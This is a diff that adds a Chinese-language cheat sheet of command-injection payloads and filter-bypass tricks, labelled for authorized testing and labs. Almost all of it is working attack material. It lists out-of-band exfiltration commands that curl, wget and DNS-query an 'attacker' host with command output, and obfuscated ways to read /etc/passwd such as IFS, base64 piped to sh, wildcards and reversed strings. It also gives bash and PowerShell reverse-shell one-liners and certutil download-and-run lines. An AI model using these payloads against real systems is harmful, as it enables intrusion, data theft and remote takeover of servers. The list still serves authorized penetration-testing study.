@@ -1,0 +1,96 @@
+==========================================================================
+ 命令注入 / 命令执行 Payload 与绕过速查
+ 仅用于授权测试与靶场
+==========================================================================
+
+【0x01 命令连接符】
+  Linux:
+    ; id          顺序执行
+    | id          只显示后一条输出
+    || id         前一条失败才执行
+    & id          后台执行前一条，再执行后一条
+    && id         前一条成功才执行
+    `id`          命令替换（反引号）
+    $(id)         命令替换
+    %0a id        换行注入（URL 编码 \n）
+    %0d%0a        CRLF
+    {id,}         bash 花括号扩展，等价 id
+  Windows:
+    & whoami  && whoami  | whoami  || whoami
+    %0a  换行（部分）
+    ` 反引号在 PowerShell 是执行运算符: `whoami`（PowerShell 中用 $(whoami)）
+
+【0x02 探测 payload】
+  ;id   ;whoami   |id   $(id)   `id`   &&id
+  时间盲注（无回显）:
+    ;sleep 5       |sleep 5     $(sleep 5)
+    & ping -c 5 127.0.0.1 &
+    Windows: & timeout /t 5    & ping -n 5 127.0.0.1
+  外带（无回显首选）:
+    ;curl http://attacker:8888/`whoami`
+    ;curl http://attacker:8888/?d=$(id|base64|tr -d '\n')
+    ;wget http://attacker/$(hostname)
+    DNS: ;nslookup `whoami`.xxx.dnslog.cn
+    Windows: certutil -urlcache -split -f http://attacker/x
+             powershell (New-Object Net.WebClient).DownloadFile(...)
+  布尔: ;if [ $(id -u) -eq 0 ];then sleep 3;fi
+
+【0x03 空格被过滤】
+  ${IFS}  ${IFS}$9  $IFS$9  <  重定向代替: cat</etc/passwd
+  {cat,/etc/passwd}
+  $@ 、 $* 占位: c$@at /etc/passwd
+  tab %09  %0b %0c %a0
+  bash 变量切片: cat$IFS/etc/passwd
+  花括号: /bin/cat${IFS}/etc/passwd
+
+【0x04 关键字被过滤】
+  变量拼接:   a=c;b=at;$a$b /etc/passwd   ; c=ca''t ; ca\t /etc/passwd
+  引号拆分:   c'a't /etc/passwd   c""at /etc/passwd   ca\t
+  通配符:     /bin/c?T 不行（大小写）； /bin/ca? /etc/pas?wd
+              /bin/cat /etc/p*d   /???/??t /???/??ss??
+  环境变量切片:
+    ${PATH:0:1} 得到 / ； ${HOME:0:1}
+    echo $PATH 取字符拼命令
+  反斜杠/通配: /usr/bin/c\u?l
+  base64:     echo Y2F0IC9ldGMvcGFzc3dk|base64 -d|sh
+  十六进制:   \x63\x61\x74 /etc/passwd （echo -e 后管道 sh）
+  反转:       echo "dassap/cte/tac"|rev|sh
+  无回显数字: $(()) 算术、> < 构造字符: >$(printf '\x63')...
+  无字母 RCE (CTF 爱考):
+    BASH: $@ 与通配符；$(printf "\x...")
+    PHP: 无字母数字 webshell: ($_=[]).'' 拼接 + 异或/取反构造 assert
+         POST: $_=[];... 经典异或马
+    Windows: set 变量切片拼接
+
+【0x05 路径/字符绕过】
+  / 被过滤: cd ..;cd etc;cat passwd
+  点被过滤: cd ..; cd ..; cd etc; cat passwd
+  数字被过滤: >$(true) 即 >$? 产生 0/1
+  命令名不存在: 用绝对路径 /usr/bin/id；which 找
+  无 PATH: env -i /bin/sh；直接 /bin/busybox id
+
+【0x06 常见注入点参数】
+  ip= host= target= addr= dest= page= file= name= cmd= exec=
+  doc= page= site= html= api= ping= trace= route= net=
+  功能: ping/网络诊断、DNS 查询、文件转换、图片处理、视频转换(ffmpeg)、
+  备份恢复、压缩解压、计划任务、邮件测试、打印机、路由诊断、
+  调用 git/curl/wget/nmap/openssh 的功能
+
+【0x07 命令注入 -> 反弹 shell】
+  bash: bash -c 'bash -i >& /dev/tcp/IP/PORT 0>&1'
+  URL 编码整条（见 reverse_shell_gen.py 生成 20+ 版本）
+  无 curl/wget 落地:
+    exec 3<>/dev/tcp/IP/PORT;cat <&3|while read l;do $l 2>&3;done
+  Windows:
+    powershell -nop -c "$c=New-Object Net.Sockets.TCPClient('IP',PORT);..."
+    certutil -urlcache -split -f http://IP/a.exe a.exe&a.exe
+  容器环境: 先 id; cat /proc/1/cgroup; ls /.dockerenv; 再考虑逃逸
+
+【0x08 命令注入 vs 代码执行（别混淆）】
+  PHP: system/exec/shell_exec/passthru/popen/反引号；
+       RCE: eval/assert/preg_replace /e/create_function/动态函数 $f()
+  Python: os.system/subprocess/eval/exec/pickle/yaml.load
+  Java: Runtime.exec/ProcessBuilder/ScriptEngine/SpEL/OGNL
+  Node: child_process.exec/eval/Function
+  .NET: Process.Start/PowerShell 注入
+==========================================================================
